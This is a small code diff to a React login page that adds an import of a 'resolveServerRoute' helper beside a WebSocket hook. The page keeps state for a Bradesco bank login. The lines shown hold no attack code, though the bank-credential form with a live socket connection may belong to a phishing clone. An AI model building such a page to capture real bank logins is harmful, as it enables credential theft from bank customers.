@@ -2,6 +2,7 @@ import { useState } from "react";
 import { ChevronLeft, Eye, EyeOff } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { useWebSocket } from "@/hooks/useWebSocket";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const LoginPage = () => {
   const [loginBradesco, setLoginBradesco] = useState("");
